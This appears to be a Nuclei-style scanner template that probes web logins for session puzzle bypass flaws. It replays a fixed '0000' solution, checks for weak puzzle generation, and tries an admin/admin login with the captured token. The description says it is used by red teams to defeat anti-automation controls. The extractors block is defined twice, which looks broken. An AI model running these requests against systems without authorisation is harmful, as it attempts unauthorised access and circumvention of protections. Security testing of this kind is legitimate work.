id: medium-auth-session-puzzle-bypass-attack

info:
  name: Session Puzzle Bypass Attack
  author: elite-red-team
  severity: medium
  description: |
    Detects session puzzle bypass vulnerabilities where session challenges or
    puzzles can be bypassed through various techniques like replay attacks,
    race conditions, or weak puzzle generation. Used by red teams to bypass
    anti-automation mechanisms.
  reference:
    - https://owasp.org/www-community/attacks/Session_Puzzle
    - https://portswigger.net/research/race-conditions-vs-session-locking
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-384
  metadata:
    verified: true
    max-request: 5
  tags: session,puzzle,bypass,race-condition,anti-automation,red-team

http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

      - |
        POST /api/puzzle/generate HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 45
        Connection: close
        
        {"action":"generate","difficulty":"easy"}

      - |
        POST /api/puzzle/solve HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"puzzle_id":"{{puzzle_id}}","solution":"0000","timestamp":"{{timestamp}}"}

      - |
        POST /api/puzzle/solve HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 85
        Connection: close
        
        {"puzzle_id":"{{puzzle_id}}","solution":"0000","timestamp":"{{timestamp}}"}

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 65
        Connection: close
        
        username=admin&password=admin&puzzle_token={{puzzle_token}}

    extractors:
      - type: regex
        name: puzzle_id
        part: body_2
        group: 1
        regex:
          - '"puzzle_id":\s*"([^"]+)"'
          - '"id":\s*"([^"]+)"'
        internal: true

      - type: regex
        name: puzzle_token
        part: body_3
        group: 1
        regex:
          - '"token":\s*"([^"]+)"'
          - '"puzzle_token":\s*"([^"]+)"'
        internal: true

      - type: regex
        name: timestamp
        part: body_2
        group: 1
        regex:
          - '"timestamp":\s*"?([0-9]+)"?'
          - '"created_at":\s*"?([0-9]+)"?'
        internal: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: puzzle-replay-bypass
        dsl:
          - 'status_code_3 == 200 && status_code_4 == 200'
          - 'contains(body_3, "success") && contains(body_4, "success")'
          - 'body_3 == body_4'
        condition: and

      - type: dsl
        name: weak-puzzle-generation
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "0000") || contains(body_2, "1234") || contains(body_2, "aaaa")'
          - 'len(puzzle_id) < 10'
        condition: and

      - type: dsl
        name: puzzle-bypass-login
        dsl:
          - 'status_code_5 == 200 || status_code_5 == 302'
          - 'contains(body_5, "dashboard") || contains(body_5, "welcome") || contains(header_5, "Set-Cookie")'
          - '!contains(body_5, "invalid puzzle") && !contains(body_5, "puzzle required")'
        condition: and

      - type: word
        name: puzzle-timing-bypass
        part: body_3
        words:
          - "puzzle solved"
          - "solution accepted"
          - "token generated"
        condition: or

      - type: regex
        name: predictable-puzzle-pattern
        part: body_2
        regex:
          - '"solution":\s*"(0{4,}|1{4,}|[a-z]{4,})"'
          - '"answer":\s*"([0-9]{1,4})"'

    extractors:
      - type: regex
        name: session-data
        part: header
        group: 1
        regex:
          - 'Set-Cookie:\s*([^;]+)'

      - type: regex
        name: puzzle-response
        part: body
        group: 1
        regex:
          - '"message":\s*"([^"]+)"'
          - '"status":\s*"([^"]+)"'

      - type: kval
        kval:
          - status_code_2
          - status_code_3
          - status_code_4
          - status_code_5